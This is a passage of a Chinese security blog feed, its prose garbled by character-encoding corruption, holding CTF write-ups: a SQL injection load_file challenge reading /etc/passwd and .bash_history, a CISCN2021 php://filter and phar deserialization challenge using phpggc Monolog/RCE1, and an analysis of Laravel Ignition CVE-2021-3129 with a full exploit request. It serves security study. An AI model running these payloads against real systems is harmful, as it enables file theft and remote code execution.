ä¸ºå¦‚æœåœ¨æ•°æ®åº“ä¸­ï¼Œä¸éœ€è¦rootæƒé™)ï¼Œç°åœ¨è¦ç”¨ <strong>SQLè¯­å¥</strong> è¯»å–flagæ–‡ä»¶</p><blockquote><p>æ ¼å¼</p><p><code>select load_file(â€˜æ–‡ä»¶ç»å¯¹è·¯å¾„â€™)</code></p><p>å¸¸è§ç”¨æ³•</p><blockquote><ul><li>è¯»/etc/init.dä¸‹çš„ä¸œè¥¿ï¼Œè¿™é‡Œæœ‰é…ç½®æ–‡ä»¶è·¯å¾„<br><code>?id=1' union select 1,2,load_file('/etc/init.d/httpd')</code></li><li>å¾—åˆ°webå®‰è£…è·¯å¾„<br><code>?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')</code></li><li>è¯»å–å¯†ç æ–‡ä»¶<br><code>?id=1' union select 1,2,load_file('var/www/html/xxx.com/php/conn.inc.php')</code></li></ul></blockquote></blockquote></blockquote><p>payload</p><pre><code class="hljs sql">1&#x27;,content=(<span class="hljs-keyword">select</span> (<span class="hljs-keyword">load_file</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>))),<span class="hljs-comment">/*</span></code></pre><img src="/2021/07/17/lod/3.jpg" alt="3" style="zoom:67%;"><p>/etc/passwdä¸­ä¸€è¡Œè®°å½•å¯¹åº”ç€ä¸€ä¸ªç”¨æˆ·ï¼Œæ¯è¡Œè®°å½•åˆè¢«å†’å·(:)åˆ†éš”ä¸º7ä¸ªå­—æ®µï¼Œå…¶æ ¼å¼å’Œå…·ä½“å«ä¹‰å¦‚ä¸‹ï¼š</p><p><code>ç”¨æˆ·å:å£ä»¤:ç”¨æˆ·æ ‡è¯†å·:ç»„æ ‡è¯†å·:æ³¨é‡Šæ€§æè¿°:ä¸»ç›®å½•:ç™»å½•Shell</code></p><p><strong>tips</strong></p><blockquote><p>ä¼ªç”¨æˆ·å«ä¹‰:</p><p>bin        æ‹¥æœ‰å¯æ‰§è¡Œçš„ç”¨æˆ·å‘½ä»¤æ–‡ä»¶</p><p>sys        æ‹¥æœ‰ç³»ç»Ÿæ–‡ä»¶</p><p>adm       æ‹¥æœ‰å¸æˆ·æ–‡ä»¶</p><p>uucp      UUCPä½¿ç”¨</p><p>lplpæˆ–lpd   å­ç³»ç»Ÿä½¿ç”¨</p><p>nobody    NFSä½¿ç”¨</p><p>å¦‚ä¸‹ï¼š</p><img src="/2021/07/17/lod/4.jpg" alt="4" style="zoom:50%;"><table><thead><tr><th>å­—æ®µ</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>1</td><td>ç”¨æˆ·å</td></tr><tr><td>2</td><td>ç”¨æˆ·çš„å¯†ç åŸæ¥ç›´æ¥å­˜å‚¨åœ¨ç¬¬äºŒå­—æ®µï¼Œä½†æ˜¯ä¸ºäº†å®‰å…¨ï¼Œæœ€åä¸“é—¨æœ‰äº†/etc/shadowæ–‡ä»¶ï¼Œç°åœ¨é»˜è®¤ç”¨xæ›¿ä»£</td></tr><tr><td>3</td><td>ç”¨æˆ·çš„uid,ä¸€èˆ¬æƒ…å†µä¸‹rootä¸º0ï¼Œ1-499é»˜è®¤ä¸ºç³»ç»Ÿè´¦å·ï¼Œæœ‰çš„æ›´å¤§äº›åˆ°1000ï¼Œ500-65535ä¸ºç”¨æˆ·çš„å¯ç™»å½•è´¦å·ï¼Œæœ‰çš„ç³»ç»Ÿä»1000å¼€å§‹ã€‚</td></tr><tr><td>4</td><td>ç”¨æˆ·çš„gid,linuxçš„ç”¨æˆ·éƒ½ä¼šæœ‰ä¸¤ä¸ªID,ä¸€ä¸ªæ˜¯ç”¨æˆ·uidï¼Œä¸€ä¸ªæ˜¯ç”¨æˆ·ç»„idï¼Œåœ¨æˆ‘ä»¬ç™»å½•çš„æ—¶å€™ï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå…¶å®ä¼šå…ˆåˆ°/etc/passwdæŸ¥çœ‹æ˜¯å¦æœ‰ä½ è¾“å…¥çš„è´¦å·æˆ–è€…ç”¨æˆ·åï¼Œæœ‰çš„è¯å°†è¯¥è´¦å·ä¸å¯¹åº”çš„UIDå’ŒGID(åœ¨/etc/groupä¸­)è¯»å‡ºæ¥ã€‚ç„¶åè¯»å‡ºä¸»æ–‡ä»¶å¤¹ä¸shellçš„è®¾ç½®ï¼Œç„¶åå†å»æ£€éªŒå¯†ç æ˜¯å¦æ­£ç¡®ï¼Œæ­£ç¡®çš„è¯æ­£å¸¸ç™»å½•ã€‚</td></tr><tr><td>5</td><td>ç”¨æˆ·çš„è´¦å·è¯´æ˜è§£é‡Š</td></tr><tr><td>6</td><td>ç”¨æˆ·çš„å®¶ç›®å½•æ–‡ä»¶å¤¹</td></tr><tr><td>7</td><td>ç”¨æˆ·ä½¿ç”¨çš„shellï¼Œå¦‚æœæ¢æˆ/sbin/nologin/å°±æ˜¯é»˜è®¤æ²¡æœ‰ç™»å½•ç¯å¢ƒçš„ã€‚</td></tr></tbody></table></blockquote><p>wwwç”¨æˆ·(ä¸€èˆ¬å’Œç½‘ç«™æ“ä½œç›¸å…³çš„ç”¨æˆ·ï¼Œç”±ä¸­é—´ä»¶åˆ›å»ºï¼‰çš„ç›®å½•æ˜¯/home/wwwå¯ä»¥æŸ¥çœ‹ <code>.bash_history</code> è®°å½•ï¼ˆæ¯ä¸ªåœ¨ç³»ç»Ÿä¸­æ‹¥æœ‰è´¦å·çš„ç”¨æˆ·åœ¨ä»–çš„ç›®å½•ä¸‹éƒ½æœ‰ä¸€ä¸ªâ€œ.bash_historyâ€æ–‡ä»¶ï¼Œä¿å­˜äº†å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤ï¼Œæ–¹ä¾¿æŸ¥æ‰¾ã€‚ï¼‰</p><p>payload</p><pre><code class="hljs awk">a<span class="hljs-string">&#x27;,content=(select (load_file(&#x27;</span><span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/.bash_history&#x27;))),/</span>*</code></pre><p><img src="/2021/07/17/lod/5.jpg" alt="5"></p><p>å…ˆè¿›å…¥/tmp/ç›®å½•ï¼Œç„¶åè§£å‹html.zipï¼ŒåˆæŠŠè¿™ä¸ª.zipæ–‡ä»¶åˆ é™¤äº†ã€‚ç„¶ååˆæŠŠè§£å‹å¾—åˆ°çš„htmlè¿™ä¸ªæ–‡ä»¶å¤¹å¤åˆ¶åˆ°äº†/var/www/ä¸‹é¢ï¼Œç„¶ååˆè¿›å…¥/var/www/htmlï¼Œå°†.DS_Store(.DS_Store(è‹±æ–‡å…¨ç§° Desktop Services Store)æ˜¯ä¸€ç§ç”±è‹¹æœå…¬å¸çš„Mac OS Xæ“ä½œç³»ç»Ÿæ‰€åˆ›é€ çš„éšè—æ–‡ä»¶ï¼Œ<em>ç›®çš„åœ¨äºå­˜è´®ç›®å½•çš„è‡ªå®šä¹‰å±æ€§</em>ï¼Œä¾‹å¦‚æ–‡ä»¶ä»¬çš„å›¾æ ‡ä½ç½®æˆ–è€…æ˜¯èƒŒæ™¯è‰²çš„é€‰æ‹©ã€‚<em>é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•</em>ã€‚)ç»™åˆ é™¤ï¼Œç„¶åå¼€å¯apache2æœåŠ¡ã€‚</p><p><em>/var/www/htmlä¸‹çš„.DS_Storeè¢«åˆ ï¼Œè€Œ/tmp/htmlä¸‹çš„.DS_Storeæ²¡æœ‰è¢«åˆ é™¤</em></p><p><code>.DS_Store</code> æ–‡ä»¶ä¸­ï¼Œç»å¸¸ä¼šæœ‰ä¸€äº›ä¸å¯é”®å­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨hexå‡½æ•°å¯¹å…¶å†…å®¹è¿›è¡Œè½¬æ¢ï¼Œ</p><p>payload</p><pre><code class="hljs awk"><span class="hljs-string">&#x27;, content=(select hex(load_file(&#x27;</span><span class="hljs-regexp">/tmp/</span>html<span class="hljs-regexp">/.DS_Store&#x27;))),/</span>*</code></pre><p>è§£ç </p><p><img src="/2021/07/17/lod/6.jpg" alt="6"></p><p>flagåœ¨flag_8946e1ff1ee3e40f.phpé‡Œï¼ˆä¸èƒ½åœ¨/tmpç›®å½•ä¸‹ï¼Œè¦å›åˆ°/var/www/html ï¼‰</p><p>payload</p><pre><code class="hljs æœ€åä¸€ä¸ªå‘ï¼ŒæŸ¥çœ‹æºç è·å¾—flag">a&#39;,content&#x3D;(select hex(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;))),&#x2F;*</code></pre><p>è§£ç </p><img src="/2021/07/17/lod/7.jpg" alt="7" style="zoom: 67%;"><p>å‚è€ƒï¼š</p><p><a href="https://mochazz.github.io/2018/09/01/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E5%9B%9B%E5%9C%BA/#comment">2018ç½‘é¼æ¯ç¬¬å››åœºWebé¢˜è§£</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2021 Quals-filter</title>
    <link href="/2021/07/15/filter2/"/>
    <url>/2021/07/15/filter2/</url>
    
    <content type="html"><![CDATA[<p>äº†è§£yii2åŠlavaelåfilterçš„å¤ç°å°±å¾ˆç®€å•äº†</p><p>hintï¼š</p><p><img src="/2021/07/15/filter2/1.jpg" alt="1"></p><p>é™„ä»¶åšäº†å¦‚ä¸‹æ›´æ”¹</p><p><img src="/2021/07/15/filter2/2.jpg" alt="2"></p><p>çœ‹ä¸€ä¸‹ä¾èµ–å‘ç°<code>monolog</code>ç¬¦åˆ</p><p><img src="/2021/07/15/filter2/3.jpg" alt="3"></p><p>ç›´æ¥æ‰“</p><h4 id="æ¸…ç©ºæ—¥å¿—æ–‡ä»¶"><a class="header-anchor" href="#æ¸…ç©ºæ—¥å¿—æ–‡ä»¶">ğŸ­</a>æ¸…ç©ºæ—¥å¿—æ–‡ä»¶</h4><p><code>?file=php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</code></p><p><img src="/2021/07/15/filter2/4.jpg" alt="4"></p><h4 id="ç”Ÿæˆpayload"><a class="header-anchor" href="#ç”Ÿæˆpayload">ğŸ­</a>ç”Ÿæˆpayload</h4><h5 id="æ³•ä¸€"><a class="header-anchor" href="#æ³•ä¸€">ğŸ­</a>æ³•ä¸€</h5><p>ç”Ÿæˆæ—¶é¡ºä¾¿ç¼–ç </p><p><code>php -d'phar.readonly=0' ./phpggc Monolog/RCE1 &quot;phpinfo&quot; &quot;1&quot; --phar phar -o php://output | base64 -w0 | python -c &quot;import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())&quot;</code></p><p><img src="/2021/07/15/filter2/8.png" alt="8"></p><h5 id="æ³•äºŒ"><a class="header-anchor" href="#æ³•äºŒ">ğŸ­</a>æ³•äºŒ</h5><p>å…ˆç”Ÿæˆå†ç¼–ç </p><p>``php -dâ€™phar.readonly=0â€™ ./phpggc Monolog/RCE1 â€œphpinfoâ€ â€œ1â€ --phar phar -o php://output | base64 -w0`</p><p>ç¼–ç è„šæœ¬</p><pre><code class="hljs stylus">from binascii import b2a_hexpayload = <span class="hljs-string">&quot;&quot;</span>armedPayload = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> payload:    <span class="hljs-selector-tag">i</span> = <span class="hljs-string">&quot;=&quot;</span>+b2a_hex(<span class="hljs-selector-tag">i</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).upper()    armedPayload += i+<span class="hljs-string">&quot;=00&quot;</span><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;123456789012345&quot;</span>+armedPayload)</span></span></code></pre><h4 id="å‘é€å¶æ•°æ–‡ä»¶å"><a class="header-anchor" href="#å‘é€å¶æ•°æ–‡ä»¶å">ğŸ­</a>å‘é€å¶æ•°æ–‡ä»¶å</h4><pre><code class="hljs routeros">?<span class="hljs-attribute">file</span>=AA</code></pre><h4 id="å†™å…¥æ—¥å¿—"><a class="header-anchor" href="#å†™å…¥æ—¥å¿—">ğŸ­</a>å†™å…¥æ—¥å¿—</h4><p>è®°å¾—åŠ å­—ç¬¦aï¼ˆLaravel debug rceé‡Œè§£é‡Šè¿‡äº†ï¼‰</p><p><img src="/2021/07/15/filter2/5.jpg" alt="5"></p><h4 id="è¿‡æ»¤æ— å…³å­—ç¬¦"><a class="header-anchor" href="#è¿‡æ»¤æ— å…³å­—ç¬¦">ğŸ­</a>è¿‡æ»¤æ— å…³å­—ç¬¦</h4><p><code>file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</code></p><p><img src="/2021/07/15/filter2/6.jpg" alt="6"></p><h4 id="è§¦å‘phar"><a class="header-anchor" href="#è§¦å‘phar">ğŸ­</a>è§¦å‘phar</h4><p><code>file=phar://../runtime/logs/app.log/test.txt</code></p><p><img src="/2021/07/15/filter2/9.png" alt="9"></p><p>æ ¹ç›®å½•ä¸‹æ‰¾åˆ°<code>This_is_flaaagggg</code></p><p>ç”Ÿæˆpayloadé“¾</p><pre><code class="hljs awk">php -d<span class="hljs-string">&#x27;phar.readonly=0&#x27;</span> .<span class="hljs-regexp">/phpggc Monolog/</span>RCE1 <span class="hljs-string">&quot;system&quot;</span> <span class="hljs-string">&quot;cat /This_is_flaaagggg&quot;</span> --phar phar -o php:<span class="hljs-regexp">//</span>output | base64 -w0 | python -c <span class="hljs-string">&quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:].zfill(2) + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span></code></pre><p><img src="/2021/07/15/filter2/11.png" alt="11"></p><p>å†é‡å¤ä¸€éä¸Šé¢çš„æ“ä½œï¼ˆè®°å¾—å†æ¸…ä¸€æ¬¡æ—¥å¿—ï¼‰ï¼Œå¾—åˆ°flagï¼š</p><p><img src="/2021/07/15/filter2/12.png" alt="12"></p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_38154820/article/details/117794547">é€šè¿‡å‡ é“CTFé¢˜å­¦ä¹ yii2æ¡†æ¶</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>phar</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Laravel Debug RCEï¼ˆCVE-2021-3129ï¼‰åˆ†æ</title>
    <link href="/2021/07/14/rce-0/"/>
    <url>/2021/07/14/rce-0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00ç®€ä»‹"><a class="header-anchor" href="#0x00ç®€ä»‹">ğŸ­</a>0x00ç®€ä»‹</h2><p>Laravelæ˜¯ä¸€å¥—ç®€æ´ã€ä¼˜é›…çš„PHP Webå¼€å‘æ¡†æ¶(PHP Web Framework)ã€‚å®ƒå¯ä»¥è®©ä½ ä»é¢æ¡ä¸€æ ·æ‚ä¹±çš„ä»£ç ä¸­è§£è„±å‡ºæ¥ï¼›å®ƒå¯ä»¥æ„å»ºä¸€ä¸ªå®Œç¾çš„ç½‘ç»œAPPï¼Œè€Œä¸”æ¯è¡Œä»£ç éƒ½å¯ä»¥ç®€æ´ã€å¯Œäºè¡¨è¾¾åŠ›ã€‚</p><h2 id="0x01æ¼æ´æ¦‚è¿°"><a class="header-anchor" href="#0x01æ¼æ´æ¦‚è¿°">ğŸ­</a>0x01æ¼æ´æ¦‚è¿°</h2><p>å½“Laravelå¼€å¯äº†Debugæ¨¡å¼æ—¶ï¼Œç”±äºLaravelè‡ªå¸¦çš„Ignition ç»„ä»¶å¯¹file_get_contents()å’Œfile_put_contents()å‡½æ•°çš„ä¸å®‰å…¨ä½¿ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘èµ·æ¶æ„è¯·æ±‚ï¼Œæ„é€ æ¶æ„Logæ–‡ä»¶ç­‰æ–¹å¼è§¦å‘Pharååºåˆ—åŒ–ï¼Œæœ€ç»ˆé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><h2 id="0x02å½±å“ç‰ˆæœ¬"><a class="header-anchor" href="#0x02å½±å“ç‰ˆæœ¬">ğŸ­</a>0x02å½±å“ç‰ˆæœ¬</h2><p>Laravel &lt;= 8.4.2<br>Ignition &lt;= 2.5.1</p><h2 id="0x03ç¯å¢ƒæ­å»º"><a class="header-anchor" href="#0x03ç¯å¢ƒæ­å»º">ğŸ­</a>0x03ç¯å¢ƒæ­å»º</h2><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SNCKER/</span>CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3129</span>cd CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3129</span>docker-compose up -d<span class="hljs-regexp">//</span>æ‹‰å–é•œåƒ</code></pre><p>å»ºå®Œè®¿é—®</p><p><img src="/2021/07/14/rce-0/1.jpg" alt="1"></p><h2 id="0x04æ¼æ´åˆ†æ"><a class="header-anchor" href="#0x04æ¼æ´åˆ†æ">ğŸ­</a>0x04æ¼æ´åˆ†æ</h2><p>ä¸ºå¤ç°å˜é‡æœªå®šä¹‰æ—¶å‡ºç°çš„æŠ¥é”™æƒ…å†µï¼Œæ¼æ´æ–‡ä»¶åœ¨resource/views/ hello.blade.phpä¸­è®¾ç½®ä¸€ä¸ªç®€å•çš„æ¨¡æ¿</p><p><img src="/2021/07/14/rce-0/4.jpg" alt="4"></p><p>å¹¶åœ¨routes/web.phpä¸­æ·»åŠ è·¯ç”±</p><p><img src="/2021/07/14/rce-0/5.jpg" alt="5"></p><p>è®¿é—®å‡ºç°å˜é‡æœªå®šä¹‰çš„æŠ¥é”™ä¿¡æ¯</p><p><img src="/2021/07/14/rce-0/3.jpg" alt="3"></p><p>æŠ“åŒ…</p><p><img src="/2021/07/14/rce-0/6.jpg" alt="6"></p><p>è¯·æ±‚çš„æ¥å£ä¸º/_ignition/execute-solutionï¼Œä»¥æ­¤å…¥æ‰‹ï¼Œå®¡è®¡ä»£ç ã€‚æœç´¢è·¯ç”±</p><p><img src="/2021/07/14/rce-0/7.jpg" alt="7"></p><p>å¯¹åº”çš„å¤„ç†ç±»ä¸ºExecuteSolutionControllerï¼Œæ­¤å¤„ç±»å¯¹è±¡è¢«å½“åšå‡½æ•°è°ƒç”¨ï¼Œå› æ­¤ä¼šè°ƒç”¨ExecuteSolutionControllerç±»çš„__invokeæ–¹æ³•ã€‚</p><p><img src="/2021/07/14/rce-0/8.jpg" alt="8"></p><p>å…ˆè°ƒç”¨ExecuteSolutionRequest-&gt;getRunnableSolution()è·å–solutionå¯¹è±¡ï¼Œéšåè°ƒç”¨solutionå¯¹è±¡çš„runæ–¹æ³•ï¼Œå…ˆè·Ÿè¿›ExecuteSolutionRequestçš„getRunnableSolutionæ–¹æ³•</p><p><img src="/2021/07/14/rce-0/9.jpg" alt="9"></p><p><code>solutionå¯¹è±¡æ¥è‡ªgetSolutionæ–¹æ³•çš„è¿”å›ï¼Œå¹¶ä¸”å¿…é¡»æ˜¯RunnableSolutionç±»çš„å®ä¾‹</code>==&gt;<code>solutionå¯¹è±¡çš„ç±»å¿…é¡»æ˜¯RunnableSolutionç±»çš„å­ç±»</code>,åœ¨getSolutionæ–¹æ³•ä¸­ï¼Œç±»æ¥æºäºä¼ é€’çš„solutionå‚æ•°</p><p><img src="/2021/07/14/rce-0/10.jpg" alt="10"></p><p>MakeView VariableOptionalSolutionæ°å¥½ç»§æ‰¿äºRunableSolutionæ¥å£ï¼Œç¬¦åˆä¸Šè¿°æ¡ä»¶ã€‚è·Ÿè¿›åˆ°MakeViewVariableOptionalSolutionçš„runæ–¹æ³•ï¼Œ</p><p><img src="/2021/07/14/rce-0/11.jpg" alt="11"></p><p><code>$parameters</code>å‚æ•°è¢«ä¼ é€’åˆ°makeOptionalå‚æ•°å¤„ç†ï¼Œå¹¶ä¸”viewFileå‚æ•°å¯¹åº”çš„æ–‡ä»¶ä¼šè¢«file_get_contentsæ–¹æ³•è¯»å–ï¼Œ</p><p><img src="/2021/07/14/rce-0/12.jpg" alt="12"></p><p>å¹¶å°†<code>$username</code>æ›¿æ¢ä¸º<code>$username ? â€˜â€™</code>ï¼Œåç»­ä¼šåšTokenåŒ–æ¯”å¯¹ï¼Œå› æ­¤æ²¡åŠæ³•ç›´æ¥æ§åˆ¶variableNameå‚æ•°ã€‚ä½†ç”±äºviewFileå¯æ§ï¼Œä¸”ç»è¿‡file_get_contentsæ–¹æ³•å¤„ç†ï¼Œå¦‚æœèƒ½å¤Ÿä¸Šä¼ æˆ–è€…å†™å…¥Pharæ–‡ä»¶ï¼Œæ˜¯å¯ä»¥åˆ©ç”¨phar://å®ç°ååºåˆ—åŒ–çš„ã€‚</p><h2 id="0x05æ¼æ´åˆ©ç”¨"><a class="header-anchor" href="#0x05æ¼æ´åˆ©ç”¨">ğŸ­</a>0x05æ¼æ´åˆ©ç”¨</h2><p>ç°åœ¨å”¯ä¸€å¯æ§éƒ¨åˆ†å†…å®¹çš„æ–‡ä»¶æ˜¯laravelçš„æ—¥å¿—æ–‡ä»¶ã€‚é€šè¿‡æœ¬æ¼æ´çš„è·¯ç”±è¯·æ±‚ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶åä½œä¸º<code>viewFile</code>çš„å€¼ï¼Œå°±å¯ä»¥æŠŠè¿™ä¸ªå€¼ä¿å­˜åˆ°logæ–‡ä»¶ä¸­ã€‚æ­¤æ—¶å°±ç®—èƒ½æ§åˆ¶ä¸€éƒ¨åˆ†æ—¥å¿—å†…å®¹ï¼Œä½†å¯æ§å†…å®¹å‰åæœ‰æ—¥æœŸã€å †æ ˆä¿¡æ¯ç­‰å¤ªå¤šä¸å¯æ§å†…å®¹ï¼Œæ²¡åŠæ³•ç›´æ¥å†™å…¥Pharæ–‡ä»¶ã€‚è¿™æ—¶å€™éœ€è¦åˆ©ç”¨php://filterä¼ªåè®®å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œå¤šç§ç¼–è§£ç ã€‚</p><blockquote><p>åˆ©ç”¨base64è§£ç èƒ½å¤Ÿåœ¨æœ‰ä¸€éƒ¨åˆ†å¹²æ‰°å†…å®¹æƒ…å†µä¸‹ä»ç„¶è§£ç æˆåŠŸï¼Œä½†å¦‚æœæœ‰=ç­‰å­—ç¬¦åˆ™å¯å¹²æ‰°æ­£å¸¸è§£ç ã€‚åˆ©ç”¨convert.iconv.utf-16le.utf-8ï¼Œå¯ä»¥å°†å…¶ä»–å¹²æ‰°å†…å®¹è½¬æ¢æˆéasciiï¼Œè€Œéasciiå­—ç¬¦å†ç»è¿‡base64è§£ç å³å¯å˜æˆç©ºã€‚ä½†utf-16leç¼–ç ä¸­ä¼šæœ‰ä¸€äº›ç©ºå­—ç¬¦ï¼Œä¼ é€’åˆ°file_get_contentsæ–¹æ³•ä¸­ä¼šæŠ¥é”™ã€‚å› æ­¤è¿˜éœ€è¦åˆ©ç”¨convert.quoted-printable-encodeå¯ä»¥å°†ç©ºå­—ç¬¦ç¼–ç ä¸º=00ï¼Œå†ä½¿ç”¨ä¸ä¹‹ç›¸å¯¹çš„decodeæ–¹æ³•å³å¯è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p></blockquote><p>æ•´ä½“çš„æµç¨‹ï¼š<code>ExecuteSolutionController-&gt;__invoke() -&gt;  ExecuteSolutionRequest -&gt; getRunnableSolution() -&gt; getSolution()  -&gt; MakeViewVariableOptionalSolution-&gt;run()</code></p><h2 id="0x06æ¼æ´å¤ç°"><a class="header-anchor" href="#0x06æ¼æ´å¤ç°">ğŸ­</a>0x06æ¼æ´å¤ç°</h2><h4 id="æ–¹å¼ä¸€"><a class="header-anchor" href="#æ–¹å¼ä¸€">ğŸ­</a>æ–¹å¼ä¸€</h4><h5 id="æ¸…ç©ºlaravel-log"><a class="header-anchor" href="#æ¸…ç©ºlaravel-log">ğŸ­</a>æ¸…ç©ºlaravel.log</h5><p>æŠ“åŒ…ï¼Œä¼ å…¥å¦‚ä¸‹å†…å®¹</p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 192.x.x.x:8888<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Referer</span>: http://192.x.x.x:8888/_ignition/execute-solution<span class="hljs-attribute">Content-Type</span>: application/json<span class="hljs-attribute">Content-Length</span>: 320<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1&#123;&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;: &quot;username&quot;,&quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=xxx/storage/logs/laravel.log&quot;&#125;&#125;</code></pre><p>å¦ä¸€ç§æ–¹æ³•æ˜¯viewfileå€¼ä¸º<code>php://filter/read=convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=xxx/storage/logs/laravel.log</code></p><p>ä½†è¦æ‰§è¡Œå¤šæ¬¡æ‰èƒ½æ¸…ç©ºæ—¥å¿—ã€‚å› ä¸ºå¤šæ¬¡base64è§£ç å‡ºç°ä¸€äº›éé¢„æœŸçš„é—®é¢˜ï¼Œå¦‚æœåœ¨æŸæ¬¡decodeæ—¶ï¼Œ<code>=</code>å·åé¢å‡ºç°äº†åˆ«çš„base64å­—ç¬¦ï¼Œphpä¼šæŠ¥Warningã€‚ä¸”ç”±äºlaravelå¼€å¯äº†debugæ¨¡å¼ï¼Œæ‰€ä»¥ä¼šè§¦å‘<code>Ignition</code>ç”Ÿæˆé”™è¯¯é¡µé¢ï¼Œå¯¼è‡´decodeåçš„å­—ç¬¦æ²¡æœ‰æˆåŠŸå†™å…¥ã€‚</p><h5 id="å‘é€å¶æ•°æ–‡ä»¶åçš„è¯·æ±‚"><a class="header-anchor" href="#å‘é€å¶æ•°æ–‡ä»¶åçš„è¯·æ±‚">ğŸ­</a>å‘é€å¶æ•°æ–‡ä»¶åçš„è¯·æ±‚</h5><p>å‘é€ä¸€ä¸ªviewFileå€¼ä¸º11çš„è¯·æ±‚å³å¯(åŸå› å¦‚ä¸‹é¢å‘ç‚¹3)</p><h5 id="å‘æ—¥å¿—ä¸­æ’å…¥Payload"><a class="header-anchor" href="#å‘æ—¥å¿—ä¸­æ’å…¥Payload">ğŸ­</a>å‘æ—¥å¿—ä¸­æ’å…¥Payload</h5><p>ä»phpggcé‡Œæ‹¿ä¸€æ¡laravelä¸­å­˜åœ¨çš„æ‹“å±•çš„é“¾å­ç”Ÿæˆpayloadï¼ˆphpggcç”¨æ³•åœ¨å¦ä¸€ç¯‡æ–‡ç« è¯´æ˜ï¼‰</p><pre><code class="hljs awk">.<span class="hljs-regexp">/phpggc monolog/</span>rce1 call_user_func phpinfo --phar phar -o php:<span class="hljs-regexp">//</span>output</code></pre><p>å› ä¸ºä¿å­˜åˆ°logä¸­çš„POCæœ‰è®¸å¤šåƒåœ¾å­—ç¬¦ï¼Œå¦‚å½“å†™å…¥POCPOCPOCæ—¶ä¼šæœ‰ä¸‰å¤„å­—ç¬¦æ˜¾ç¤º</p><p><img src="/2021/07/14/rce-0/15.jpg" alt="15"></p><p>ä¸”POCçš„ä¸¤ä¾§éƒ½æœ‰åƒåœ¾å­—ç¬¦ã€‚å› æ­¤éœ€è¦å°è¯•æŠŠåƒåœ¾å­—ç¬¦å»æ‰ï¼Œåªä¿ç•™æˆ‘ä»¬çš„POCã€‚</p><h6 id="tipsï¼š"><a class="header-anchor" href="#tipsï¼š">ğŸ­</a>tipsï¼š</h6><p><code>utf-16le</code>æ˜¯ä¸¤ä¸ªå­—èŠ‚ä»£è¡¨ä¸€ä¸ªå­—ç¬¦ï¼ˆleæ˜¯æŒ‡å°ç«¯æ¨¡å¼ï¼‰ï¼Œ<code>utf-8</code>æ˜¯ä¸€ä¸ªå­—èŠ‚ä»£è¡¨ä¸€ä¸ªå­—ç¬¦ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸²<code>utf8</code>å­—ç¬¦å½“ä½œ<code>utf16</code>ï¼Œåœ¨è¿™æ ·è½¬æ¢æ—¶å­—ç¬¦ä¸²å°±ä¼šå˜æˆéasciiçš„ä¹±ç ã€‚ç”±äºè¿™äº›æ˜¯éasciiå­—ç¬¦ï¼Œå› æ­¤ä½¿ç”¨base64è§£ç 